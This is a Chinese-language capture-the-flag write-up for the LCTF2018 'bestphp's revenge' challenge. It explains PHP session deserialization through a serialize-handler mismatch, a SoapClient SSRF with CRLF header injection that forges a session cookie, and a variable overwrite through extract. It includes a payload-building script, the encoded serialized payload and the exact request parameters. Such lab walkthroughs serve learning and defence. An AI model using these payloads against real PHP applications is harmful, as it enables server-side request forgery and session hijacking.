# bestphp's revenge

[题目地址](https://buuoj.cn/challenges#bestphp's%20revenge)

这题看起来有两种解法，不过本质上应该是一样的。

```php
<?php
highlight_file(__FILE__);
$b = 'implode';
call_user_func($_GET['f'], $_POST);
session_start();
if (isset($_GET['name'])) {
    $_SESSION['name'] = $_GET['name'];
}
var_dump($_SESSION);
$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');
call_user_func($b, $a);
?>
```

扫目录还出来个flag.php。

```php
session_start(); 
echo 'only localhost can get flag!'; 
$flag = 'LCTF{*************************}'; 
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){ 
    $_SESSION['flag'] = $flag; 
}
```

本地才能看到flag，这就需要ssrf了。不会，看[wp](https://blog.csdn.net/qq_45691294/article/details/108790497)。这题看起来代码不多，知识点还不少啊。首先我们的目标是ssrf，但这里怎么看都不像有ssrf漏洞的样子。不过index的call_user_func和session倒是挺可疑的，能不能利用一下？
，
题目确实没有ssrf的环境，我们自己创造一个。php有个[Soap](https://www.anquanke.com/post/id/153065#h2-5)，里面有个[SoapClient](https://www.php.net/manual/zh/class.soapclient.php)类，可以发送http请求。然而怎么调用？这时就不得不请出老朋友反序列化漏洞的分支——[session反序列化漏洞](https://www.freebuf.com/articles/web/324519.html)了，可以帮我们创建出SoapClient类。文章讲得很详细，简述就是php反序列化处理器的差异导致了session反序列化漏洞。看下面两个处理器：

- php：键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
- php_serialize：经过 serialize() 函数反序列处理的数组

php会把session以序列化的形式存储在一个文件里，不同的处理器决定以何种方式存储。假如我们先用php_serialize处理器，发送`a=|O:4:“test”:0:{}`，那么session文件里存储的就是`a:1:{s:1:“a”;s:16:"|O:4:“test”:0:{}";}`。这时换成php处理器来读取，处理器就会把`a:1:{s:1:“a”;s:16:"`看成键名，`O:4:“test”:0:{}";}`看成值，session读取时再反序列化一下，一个类就这么诞生了。

默认是php处理器，我们可以用`session_start(['serialize_handler'=>'php_serialize'])`将处理器改成php_serialize注入。注入什么呢？看大佬脚本。

```php
<?php
$target = "http://127.0.0.1/flag.php";
$attack = new SoapClient(null,array('location' => $target,
    'user_agent' => "N0rth3ty\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n",
    'uri' => "123"));
$payload = urlencode(serialize($attack));
echo $payload;
"""
O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
"""
```

这里还用了一个[CRLF注入](https://www.anquanke.com/post/id/240014)。CRLF 是回车符（CR，ASCII 13，\r，%0d）和换行符（LF，ASCII 10，\n，%0a）的简称（\r\n）。在HTTP协议中，HTTP Header 部分与 HTTP Body 部分是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制 HTTP 消息头中的字符，注入一些恶意的换行，就能注入一些恶意的HTTP Header，如会话Cookie，甚至可以注入一些HTML代码。代码中的`\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4\r\n`正是如此，利用这个方法，我们伪造了一个cookie，让服务器ssrf时带上这个cookie。

接下来我们把一切和在一起。get传参f=session_start&name=`|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A56%3A%22N0rth3ty%0D%0ACookie%3A+PHPSESSID%3Dtcjr6nadpk3md7jbgioa6elfk4%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D`;post传参serialize_handler=php_serialize，将反序列化解释器改为php_serialize。发送后把注入内容写入cookie。

最后就是触发反序列化漏洞了。还有一个知识点，call_user_func()函数如果传入的参数是array类型的话，会将数组的成员当做类名和方法。下一步get传f=extract&name=SoapClient；post传b=call_user_func，触发变量覆盖漏洞，覆盖b为call_user_func。这时`call_user_func($b, $a);`就变成了`call_user_func(call_user_func, array(reset($_SESSION), 'welcome_to_the_lctf2018'));`。reset(\$_SESSION)指的是session的第一个元素，即`$_SESSION['name'] = $_GET['name'];`，这也是为什么我们要传name=SoapClient。SoapClient明显没有welcome_to_the_lctf2018这个方法，就会调用魔术方法__call()。SoapClient的魔术方法__call会发送请求，造成SSRF去访问flag.php。

最后携带脚本里的sessionid去访问就能看见flag了。这里再给出另一种[解法](https://guokeya.github.io/post/lctf-bestphps-revengesoap-fan-xu-lie-hua/)，似乎更简单一点。